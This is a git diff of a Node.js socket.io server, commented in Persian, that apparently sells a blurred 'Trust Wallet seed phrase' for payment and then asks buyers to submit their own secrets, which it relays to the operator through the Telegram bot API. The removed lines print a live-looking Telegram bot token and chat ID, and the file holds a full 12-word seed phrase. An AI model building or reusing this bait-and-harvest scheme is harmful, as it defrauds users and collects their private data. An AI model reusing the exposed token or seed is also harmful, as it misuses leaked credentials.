@@ -4,9 +4,10 @@ const { Server } = require("socket.io");
 const path = require('path');
 const https = require('https');
 
-// --- 🤖 تنظیمات تلگرام تو (ست شد) ---
-const TELEGRAM_TOKEN = "8596274256:AAHvtmJHhBG7evC3Errp20ZcxUxP-tfQ-g0";
-const ADMIN_CHAT_ID = "61848555";
+// --- 🤖 دریافت رمز از گاوصندوق سرور (امنیت ۱۰۰٪) ---
+// این خطوط رمز رو از تنظیمات Railway میخونن
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; 
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 const app = express();
 const server = http.createServer(app);
@@ -20,16 +21,20 @@ let currentEnvelope = {
     location: "Dubai, UAE 🇦🇪",
     device: "iPhone 15 Pro Max",
     tag: "💰 Wallet Seed (Balance: $7.29)",
-    // چیزی که کاربر قبل از پرداخت (تار) می‌بینه
+    // چیزی که کاربر قبل از پرداخت (تار) می‌بینه (۱۱ کلمه)
     preview: "1.extend 2.wave 3.increase 4.mother 5.connect 6.own 7.fiscal 8.lady 9.flat 10.mistake 11.leaf 12.????",
     // چیزی که بعد از پرداخت می‌بینه (کلید کامل)
-    fullContent: "Real Trust Wallet\nBalance: $7.29\n\nSeed Phase:\n1.extend\n2.wave\n3.increase\n4.mother\n5.connect\n6.own\n7.fiscal\n8.lady\n9.flat\n10.mistake\n11.leaf\n12.gather\n\nنوش جونت! حالا نوبت توئه یه چیزی بذاری...",
+    fullContent: "Real Trust Wallet (TRX/USDT)\nBalance: ~$7.29\n\nSeed Phase:\n1.extend\n2.wave\n3.increase\n4.mother\n5.connect\n6.own\n7.fiscal\n8.lady\n9.flat\n10.mistake\n11.leaf\n12.gather\n\nنوش جونت! حالا نوبت توئه یه چیزی بذاری...",
     timestamp: Date.now()
 };
 
 // تابع ارسال به تلگرام
 function sendToTelegram(message) {
-    const text = encodeURIComponent("🚨 NEW SECRET SUBMITTED:\n\n" + message);
+    if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
+        console.log("Telegram secrets not set in Railway!");
+        return; 
+    }
+    const text = encodeURIComponent("🚨 NEW ACTIVITY:\n\n" + message);
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${text}`;
     https.get(url).on('error', (e) => { console.error(e); });
 }
